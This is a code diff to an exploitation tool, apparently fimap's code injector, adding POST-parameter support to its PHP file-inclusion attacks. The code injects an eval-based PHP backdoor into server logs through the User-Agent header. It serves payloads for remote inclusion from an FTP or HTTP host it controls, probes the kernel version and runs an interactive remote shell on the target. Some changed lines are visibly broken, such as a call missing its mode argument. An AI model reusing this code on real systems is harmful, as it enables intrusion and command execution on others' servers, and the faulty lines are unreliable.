@@ -65,10 +65,15 @@ class codeinjector(baseClass):
         shcode = vuln.getAttribute("file")
         paramvalue = vuln.getAttribute("paramvalue")
         kernel = domain.getAttribute("kernel")
+        postdata = vuln.getAttribute("postdata")
+        ispost = vuln.getAttribute("ispost") == "1"
+        
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
-        path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-
+        if (not ispost):
+            path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+        else:
+            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
         php_inject_works = False
         sys_inject_works = False
         working_shell    = None
@@ -92,10 +97,16 @@ class codeinjector(baseClass):
         elif (mode.find("R") != -1):
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
-                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                if (not ispost):
+                    url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                else:
+                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
             elif settings["dynamic_rfi"]["mode"] == "local":
                 self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
-                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
+                if (not ispost):
+                    url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
+                else:
+                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
             else:
                 print "fimap is currently not configured to exploit RFI vulnerabilitys."
                 sys.exit(1)
@@ -107,7 +118,7 @@ class codeinjector(baseClass):
         php_test_code = php_test_code.replace("__PHP_QUIZ__", quiz)
         php_test_result = php_test_result.replace("__PHP_ANSWER__", answer)
 
-        code = self.__doHaxRequest(url, mode, php_test_code, suffix)
+        code = self.__doHaxRequest(url, postdata, mode, php_test_code, suffix)
         if code == None:
             self._log("php-code testing failed! code=None", self.LOG_ERROR)
             sys.exit(1)
@@ -128,13 +139,17 @@ class codeinjector(baseClass):
                     testload = payload.replace("__PAYLOAD__", base64.b64encode(shell_test_code))
                     if (mode.find("A") != -1):
                         self.setUserAgent(testload)
-                        code = self.doGetRequest(url)
+                        code = self.doPostRequest(url, postdata)
                     elif (mode.find("P") != -1):
+                        if (postdata != ""):
+                            testload = "%s&%s" %(postdata, testload)
                         code = self.doPostRequest(url, testload)
                     elif (mode.find("R") != -1):
-                        code = self.executeRFI(url, suffix, testload)
+                        code = self.executeRFI(url, postdata, suffix, testload)
                     elif (mode.find("L") != -1):
                         testload = self.convertUserloadToLogInjection(testload)
+                        if (postdata != ""):
+                            testload = "%s&%s" %(postdata, testload)
                         code = self.doPostRequest(url, testload)
                     if code != None and code.find(shell_test_result) != -1:
                         sys_inject_works = True
@@ -143,7 +158,7 @@ class codeinjector(baseClass):
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
                             uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -s"))
-                            kernel = self.__doHaxRequest(url, mode, uname_cmd, suffix).strip()
+                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, suffix).strip()
                             self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
                             self.saveXML()
@@ -162,7 +177,7 @@ class codeinjector(baseClass):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
                         pwd_cmd = payload.replace("__PAYLOAD__", base64.b64encode("pwd"))
-                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, suffix).strip()
+                        curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, suffix).strip()
                         print shell_banner
 
                         while 1==1:
@@ -171,11 +186,11 @@ class codeinjector(baseClass):
                             
                             if (cmd.strip() != ""):
                                 userload = payload.replace("__PAYLOAD__", base64.b64encode("cd '%s'; %s"%(curdir, cmd)))
-                                code = self.__doHaxRequest(url, mode, userload, suffix)
+                                code = self.__doHaxRequest(url, postdata, mode, userload, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                     cmd = payload.replace("__PAYLOAD__", base64.b64encode(cmd))
-                                    curdir = self.__doHaxRequest(url, mode, cmd , suffix).strip()
+                                    curdir = self.__doHaxRequest(url, postdata, cmd , suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
                         print "Do not forget to close this security hole."
@@ -203,7 +218,7 @@ class codeinjector(baseClass):
                         shellcode = shellcode.replace("__PAYLOAD__", base64.b64encode(cpayload))
 
 
-                    code = self.__doHaxRequest(url, mode, shellcode, appendix)
+                    code = self.__doHaxRequest(url, postdata, mode, shellcode, appendix)
                     if (code == None):
                         print "Exploiting Failed!"
                         sys.exit(1)
@@ -212,7 +227,7 @@ class codeinjector(baseClass):
             print "Failed to test php injection. :("
 
 
-    def __doHaxRequest(self, url, m, payload, appendix=None):
+    def __doHaxRequest(self, url, postdata, m, payload, appendix=None):
         code = None
         rndStart = self.getRandomStr()
         rndEnd = self.getRandomStr()
@@ -220,28 +235,39 @@ class codeinjector(baseClass):
         userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd)
         if (m.find("A") != -1):
             self.setUserAgent(userload)
-            code = self.doGetRequest(url)
+            code = self.doPostRequest(url, postdata)
         elif (m.find("P") != -1):
+            if (postdata != ""): userload = "%s&%s" %(postdata, userload)
             code = self.doPostRequest(url, userload)
         elif (m.find("R") != -1):
-            code = self.executeRFI(url, appendix, userload)
+            code = self.executeRFI(url, postdata, appendix, userload)
         elif (m.find("L") != -1):
             if (not self.isLogKickstarterPresent):
                 self._log("Testing if log kickstarter is present...", self.LOG_INFO)
                 testcode = self.getPHPQuiz()
-                code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
+                p = "data=" + base64.b64encode(testcode[0])
+                if (postdata != ""):
+                    p = "%s&%s" %(postdata, p)
+                code = self.doPostRequest(url, p)
                 if (code.find(testcode[1]) == -1):
                     self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
                     kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
                     ua = self.getUserAgent()
                     self.setUserAgent(kickstarter)
-                    tmpurl = url[:url.find("?")]
+                    tmpurl = None
+                    if (url.find("?") != -1):
+                        tmpurl = url[:url.find("?")]
+                    else:
+                        tmpurl = url
                     self.doGetRequest(tmpurl)
                     self.setUserAgent(ua)
                     
                     self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                     testcode = self.getPHPQuiz()
-                    code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
+                    p = "data=" + base64.b64encode(testcode[0])
+                    if (postdata != ""):
+                        p = "%s&%s" %(postdata, p)
+                    code = self.doPostRequest(url, p)
 
                     if (code.find(testcode[1]) == -1):
                         self._log("Failed to inject kickstarter!", self.LOG_ERROR)
@@ -256,6 +282,8 @@ class codeinjector(baseClass):
             if (self.isLogKickstarterPresent):
                 # Remove all <? and ?> tags.
                 userload = self.convertUserloadToLogInjection(userload)
+                if (postdata != ""):
+                    userload = "%s&%s" %(postdata, userload)
                 code = self.doPostRequest(url, userload)
 
         if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
@@ -352,11 +380,11 @@ class codeinjector(baseClass):
                 print "Invalid attack. Press 'q' to break."
         
         
-    def executeRFI(self, URL, appendix, content):
+    def executeRFI(self, URL, postdata, appendix, content):
         if (appendix == "%00"): appendix = ""
         if settings["dynamic_rfi"]["mode"]=="ftp":
             up = self.FTPuploadFile(content, appendix)
-            code = self.doGetRequest(URL)
+            code = self.doPostRequest(URL, postdata)
             if up["dirstruct"]:
                 self.FTPdeleteDirectory(up["ftp"])
             else:
@@ -364,7 +392,7 @@ class codeinjector(baseClass):
             return(code)
         elif settings["dynamic_rfi"]["mode"]=="local":
             up = self.putLocalPayload(content, appendix)
-            code = self.doGetRequest(URL)
+            code = self.doPostRequest(URL, postdata)
             self.deleteLocalPayload(up["local"])
             return(code)
             
@@ -421,12 +449,17 @@ class codeinjector(baseClass):
             file = n.getAttribute("file")
             param = n.getAttribute("param")
             mode = n.getAttribute("mode")
+            ispost = n.getAttribute("ispost")=="1"
+            
             if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                 doRemoteWarn = True
 
             if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                 choose[idx] = n
-                textarr.append("[%d] URL: '%s' injecting file: '%s' using param: '%s'" %(idx, path, file, param))
+                if (ispost==1):
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" %(idx, path, file, param))
+                else:
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
                 idx = idx +1
 
         if (idx == 1):
